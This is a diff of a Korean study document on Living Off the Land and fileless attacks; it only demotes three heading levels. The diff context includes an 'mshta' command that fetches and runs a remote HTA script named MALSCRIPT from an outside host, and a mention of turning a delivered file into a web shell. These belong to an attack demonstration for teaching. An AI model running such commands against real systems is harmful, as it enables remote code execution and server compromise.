@@ -26,7 +26,7 @@
 
 ---
 
-# LOL 공격 및 파일리스 공격이란
+## LOL 공격 및 파일리스 공격이란
 
 ### LOL (Living Off the Land) 공격
 - 시스템에 설치된 합법적인 바이너리, DLL 등의 도구를 이용하여 공격하는 방식.
@@ -38,7 +38,7 @@
 
 ---
 
-# 공격 시연 방법
+## 공격 시연 방법
 
 우선 침투한 파일은 웹 요청 본문으로 전달하여 웹셸(Web Shell)로 바꿀 수 있습니다. 이 공격 기법은 웹 서버를 통한 추가적인 악성 행위 수행에 활용될 수 있습니다.
 
@@ -140,7 +140,7 @@ mshta http://ethanlabs.shop/MALSCRIPT.hta
 
 ---
 
-# 공격 개요 (Diagram)
+## 공격 개요 (Diagram)
 
 ```mermaid
 graph TD
